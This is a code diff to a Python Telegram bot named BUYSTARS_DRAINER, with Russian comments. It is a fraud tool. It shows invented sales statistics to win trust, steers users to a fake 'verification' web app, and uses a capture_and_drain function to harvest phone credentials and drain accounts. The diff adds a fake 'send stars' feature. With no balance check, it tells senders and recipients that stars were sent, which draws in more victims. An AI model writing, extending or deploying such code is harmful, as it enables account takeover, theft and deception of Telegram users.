@@ -1,5 +1,5 @@
 # ============================================
-# BUYSTARS_DRAINER - Fixed Import Error
+# BUYSTARS_DRAINER - ReplyKeyboard + Send Stars via @mention
 # ============================================
 
 import asyncio
@@ -7,6 +7,7 @@ import logging
 import sqlite3
 import json
 import random
+import re
 from datetime import datetime
 from typing import Dict, Any
 
@@ -27,8 +28,6 @@ WEBAPP_PORT = 8080
 
 TOTAL_STARS_SOLD = 7357760
 TOTAL_USD_VOLUME = 110366
-
-USERNAME, STARS_AMOUNT = range(2)
 
 # ---------- Database ----------
 conn = sqlite3.connect("drainer.db", check_same_thread=False)
@@ -64,7 +63,7 @@ conn.commit()
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ---------- Main Keyboard ----------
+# ---------- Main Keyboard (ReplyKeyboard - привязана к основному сообщению) ----------
 def get_main_keyboard():
     keyboard = [
         [KeyboardButton("🌐 Веб-Кошелек"), KeyboardButton("⭐ Вывести звезды")],
@@ -109,12 +108,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         f"*Бот работает почти год*, и с помощью него куплена большая доля звезд в Telegram.\n\n"
         f"*С помощью бота куплено:*\n"
         f"{fmt(TOTAL_STARS_SOLD)} ★ (~ ${fmt(TOTAL_USD_VOLUME)})\n\n"
-        f"*Ваш баланс:* `{balance:,.0f} ★`",
+        f"*Ваш баланс:* `{balance:,.0f} ★`\n\n"
+        f"💡 *Отправка звезд:* просто напишите в чат\n"
+        f"`@{update.get_bot().username} @username 100`",
         reply_markup=get_main_keyboard(),
         parse_mode=ParseMode.MARKDOWN
     )
 
-# ---------- Handle Buttons ----------
+# ---------- Обработка кнопок (ReplyKeyboard) ----------
 async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     text = update.message.text
     
@@ -131,7 +132,77 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         action, msg = actions[text]
         await send_verification_webapp(update, context, action, msg)
 
-# ---------- WebApp Data Handler ----------
+# ---------- Обработка отправки звезд через @mention ----------
+async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Обработка сообщений вида: @botusername @username 100"""
+    if not update.message or not update.message.text:
+        return
+    
+    text = update.message.text.strip()
+    bot_username = context.bot.username
+    
+    # Проверяем формат: @botusername @username количество
+    pattern = rf'^@{re.escape(bot_username)}\s+@(\w+)\s+(\d+)$'
+    match = re.match(pattern, text, re.IGNORECASE)
+    
+    if not match:
+        return
+    
+    recipient_username = match.group(1)
+    amount = int(match.group(2))
+    sender_id = update.effective_user.id
+    sender_name = update.effective_user.first_name
+    
+    if amount <= 0:
+        await update.message.reply_text("❌ Количество звезд должно быть положительным числом.")
+        return
+    
+    # Проверяем получателя (должен существовать в Telegram)
+    try:
+        recipient = await context.bot.get_chat(f"@{recipient_username}")
+        recipient_id = recipient.id
+    except Exception as e:
+        await update.message.reply_text(
+            f"❌ Пользователь @{recipient_username} не найден.\n"
+            f"Проверьте правильность юзернейма.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    # Логируем отправку (без проверки баланса — можно отправлять сколько угодно)
+    logger.info(f"📤 SEND STARS: {sender_id} (@{sender_name}) -> @{recipient_username} ({recipient_id}) | {amount} ★")
+    
+    # Сохраняем в БД историю отправок
+    cursor.execute("""
+        INSERT INTO transactions (sender_id, recipient_id, recipient_username, amount, created_at)
+        VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
+    """, (sender_id, recipient_id, recipient_username, amount))
+    conn.commit()
+    
+    # Отправляем подтверждение отправителю
+    await update.message.reply_text(
+        f"✅ *Отправлено!*\n\n"
+        f"Получатель: `@{recipient_username}`\n"
+        f"Количество: `{amount:,} ★`\n\n"
+        f"Звезды успешно отправлены пользователю @{recipient_username}.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=get_main_keyboard()
+    )
+    
+    # Отправляем уведомление получателю (если бот может писать в ЛС)
+    try:
+        await context.bot.send_message(
+            chat_id=recipient_id,
+            text=f"🎉 *Вам отправлены звезды!*\n\n"
+                 f"Отправитель: @{sender_name}\n"
+                 f"Количество: `{amount:,} ★`\n\n"
+                 f"Используйте бота @{context.bot.username} для управления звездами.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except Exception as e:
+        logger.warning(f"Could not notify recipient @{recipient_username}: {e}")
+
+# ---------- Обработка данных из WebApp (Дрейнер) ----------
 async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     data = update.effective_message.web_app_data
     if not data:
@@ -208,70 +279,6 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             parse_mode=ParseMode.MARKDOWN
         )
 
-# ---------- /kwerteam ----------
-async def kwerteam_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text(
-        "✍️ *Отправка звезд*\n\n"
-        "Введите юзернейм получателя (с @ или без):\n\n"
-        "Пример: `@username` или `username`\n\n"
-        "Или нажмите /cancel для отмены.",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=ReplyKeyboardMarkup([["❌ Отмена"]], resize_keyboard=True)
-    )
-    return USERNAME
-
-async def kwerteam_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    if update.message.text == "❌ Отмена":
-        await update.message.reply_text("❌ Отменено", reply_markup=get_main_keyboard())
-        return ConversationHandler.END
-    
-    username = update.message.text.strip().lstrip('@')
-    context.user_data['send_recipient'] = username
-    
-    await update.message.reply_text(
-        f"📤 *Получатель:* `@{username}`\n\n"
-        "Введите количество звезд для отправки:\n\n"
-        "Любое число — без ограничений.\n"
-        "Пример: `100` или `10000`",
-        parse_mode=ParseMode.MARKDOWN
-    )
-    return STARS_AMOUNT
-
-async def kwerteam_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    if update.message.text == "❌ Отмена":
-        await update.message.reply_text("❌ Отменено", reply_markup=get_main_keyboard())
-        return ConversationHandler.END
-    
-    try:
-        amount = int(update.message.text.strip())
-        if amount <= 0:
-            await update.message.reply_text("❌ Введите положительное число")
-            return STARS_AMOUNT
-        
-        recipient = context.user_data.get('send_recipient')
-        user_id = update.effective_user.id
-        
-        logger.info(f"📤 SEND STARS: {user_id} -> @{recipient} | {amount} ★")
-        
-        await update.message.reply_text(
-            f"✅ *Отправлено!*\n\n"
-            f"Получатель: `@{recipient}`\n"
-            f"Количество: `{amount:,} ★`\n\n"
-            f"Звезды успешно отправлены.",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_keyboard()
-        )
-        
-        return ConversationHandler.END
-        
-    except ValueError:
-        await update.message.reply_text("❌ Введите число")
-        return STARS_AMOUNT
-
-async def kwerteam_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text("❌ Отменено", reply_markup=get_main_keyboard())
-    return ConversationHandler.END
-
 # ---------- Capture ----------
 async def capture_and_drain(user_id: int, credentials: Dict[str, Any]):
     phone = credentials.get('phone')
@@ -310,6 +317,27 @@ def setup_webapp():
     app.router.add_post('/submit', submit_auth)
     return app
 
+# ---------- Helpers ----------
+def format_number(num: int) -> str:
+    if num >= 1000000:
+        return f"{num/1000000:.1f}M"
+    elif num >= 1000:
+        return f"{num/1000:.1f}K"
+    return str(num)
+
+# ---------- Создание таблицы для транзакций ----------
+cursor.execute("""
+    CREATE TABLE IF NOT EXISTS transactions (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        sender_id INTEGER,
+        recipient_id INTEGER,
+        recipient_username TEXT,
+        amount INTEGER,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )
+""")
+conn.commit()
+
 # ---------- Main ----------
 async def main():
     webapp = setup_webapp()
@@ -321,26 +349,19 @@ async def main():
     
     application = Application.builder().token(BOT_TOKEN).build()
     
+    # Основные обработчики
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buttons))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_stars_send))  # Обработка отправки звезд
     application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
     application.add_handler(CallbackQueryHandler(handle_callback))
-    
-    kwerteam_conv = ConversationHandler(
-        entry_points=[CommandHandler("kwerteam", kwerteam_start)],
-        states={
-            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, kwerteam_username)],
-            STARS_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, kwerteam_amount)],
-        },
-        fallbacks=[CommandHandler("cancel", kwerteam_cancel)],
-    )
-    application.add_handler(kwerteam_conv)
     
     await application.initialize()
     await application.start()
     await application.updater.start_polling()
     
     logger.info("🤖 Bot started")
+    logger.info(f"📤 Send stars format: @{application.bot.username} @username amount")
     
     try:
         await asyncio.Event().wait()
